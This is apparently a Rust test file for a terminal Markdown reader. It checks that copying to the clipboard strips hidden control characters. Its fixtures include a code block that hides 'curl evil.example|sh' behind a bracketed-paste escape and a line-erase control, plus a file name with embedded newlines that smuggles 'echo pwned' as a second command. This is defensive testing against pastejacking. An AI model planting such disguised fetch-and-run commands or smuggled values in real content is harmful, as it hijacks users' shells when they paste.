//! Nothing reaches the clipboard that the screen did not show.
//!
//! A paste goes into a shell as often as into an editor. A fenced block
//! holding `echo harmless` + `ESC [201~` (end of bracketed paste) + NAK
//! (Ctrl-U, erase the line) + `curl evil.example|sh` paints as one harmless
//! line; `y` and a mouse selection both used to copy the bytes verbatim, and
//! a file name with a newline in it became a second command line in "copy as
//! a quote". Every producer of the clipboard outbox is driven here.

use carrel::action::{Action, NoteKey};
use carrel::app::{App, update};
use carrel_core::{BlockIdx, Document, NodeKind};

const ESC: char = '\u{1b}';

fn hostile_block() -> String {
    format!("# Setup\n\n```sh\necho harmless{ESC}[201~\u{15}curl evil.example|sh\u{8}\u{8}\n```\n")
}

/// The file name a hostile checkout can hold: an escape and two newlines.
fn hostile_name() -> String {
    format!("q{ESC}[201~\necho pwned\n.md")
}

/// Only `\n` and `\t` may be invisible, and in a one-line field not even
/// those.
fn assert_clean(copied: &str) {
    for c in copied.chars() {
        assert!(
            !c.is_control() || c == '\n' || c == '\t',
            "{c:?} reached the clipboard: {copied:?}"
        );
    }
}

fn reader(src: &str) -> App {
    let mut app = App::new("PLAN.md".into(), Document::parse(src), 80, 40);
    app.on_resize(80, 40);
    app
}

fn code_block(app: &App) -> BlockIdx {
    (0..app.doc.block_count())
        .map(|b| BlockIdx(u32::try_from(b).unwrap()))
        .find(|b| matches!(app.doc.node_for_block(*b).kind, NodeKind::CodeBlock { .. }))
        .expect("a code block")
}

#[test]
fn yanking_a_code_block_strips_the_controls_it_hid() {
    for action in [Action::YankBlock, Action::YankBlockAt(BlockIdx(0))] {
        let mut app = reader(&hostile_block());
        let action = match action {
            Action::YankBlockAt(_) => Action::YankBlockAt(code_block(&app)),
            other => other,
        };
        update(&mut app, action);
        let copied = app.clipboard.take().expect("copied");
        assert_clean(&copied);
        assert_eq!(
            &*copied, "echo harmless[201~curl evil.example|sh\n",
            "{action:?}"
        );
    }
}

#[test]
fn a_mouse_selection_strips_them_too() {
    let mut app = reader(&hostile_block());
    let node = app.doc.node_for_block(code_block(&app));
    app.selection = Some(node.doc.clone());
    update(&mut app, Action::SelectRelease);
    let copied = app.clipboard.take().expect("copied");
    assert_clean(&copied);
    assert!(copied.starts_with("echo harmless[201~curl"), "{copied:?}");
}

#[test]
fn a_quote_keeps_its_line_breaks_but_never_breaks_the_file_name() {
    let mut app = reader("# Head\u{1b}[2J\n\nhello\n\nworld\n");
    app.file = Some(format!("/work/{}", hostile_name()).into());
    app.launch_dir = Some("/work".into());
    let at = u32::try_from(app.doc.text.find("hello").unwrap()).unwrap();
    let end = u32::try_from(app.doc.text.find("world").unwrap() + 5).unwrap();
    app.selection = Some(at..end);
    update(&mut app, Action::CopyQuote);
    let copied = app.clipboard.take().expect("copied");
    assert_clean(&copied);
    let (quote, signature) = copied.split_once("\n\n").unwrap();
    assert_eq!(quote, "> hello\n> world", "content newlines are content");
    assert_eq!(
        signature, "\u{2014} q[201~echo pwned.md:3 (Head[2J)\n",
        "the file name and heading are one line each"
    );
    assert_clean(app.note.as_deref().unwrap());
}

#[test]
fn a_reference_and_a_section_link_are_one_line() {
    let mut app = reader("# Head\n\nbody\n");
    app.file = Some(format!("/work/{}", hostile_name()).into());
    app.launch_dir = Some("/work".into());
    let at = u32::try_from(app.doc.text.find("body").unwrap()).unwrap();
    update(&mut app, Action::CopyRef(at));
    assert_eq!(
        app.clipboard.take().as_deref(),
        Some("q[201~echo pwned.md:3")
    );
    update(&mut app, Action::CopySection(at));
    assert_eq!(
        app.clipboard.take().as_deref(),
        Some("q[201~echo pwned.md#head")
    );
}

#[test]
fn copying_all_notes_keeps_the_document_line_one_line() {
    let dir = tempfile::tempdir().unwrap();
    let file = dir.path().join(hostile_name());
    let src = "# Reading\n\nA unique quote.\n";
    std::fs::write(&file, src).unwrap();
    let mut app = App::new("x.md".into(), Document::parse(src), 70, 20);
    app.state_dir = Some(dir.path().join("state"));
    app.config_dir = Some(dir.path().join("config"));
    app.open_path(&file).unwrap();
    let at = u32::try_from(app.doc.text.find("unique").unwrap()).unwrap();
    app.selection = Some(at..at + 6);
    update(&mut app, Action::NoteEdit);
    for c in ['o', 'k', '\u{15}'] {
        update(&mut app, Action::NoteInput(NoteKey::Char(c)));
    }
    update(&mut app, Action::NoteInput(NoteKey::Save));
    app.clipboard = None;
    update(&mut app, Action::NotesCopy);
    let copied = app.clipboard.take().expect("copied");
    assert_clean(&copied);
    let document = copied
        .lines()
        .find(|l| l.starts_with("Document: "))
        .unwrap();
    assert!(document.ends_with("q[201~echo pwned.md"), "{copied:?}");
    assert!(!copied.contains("\necho pwned"), "{copied:?}");
}
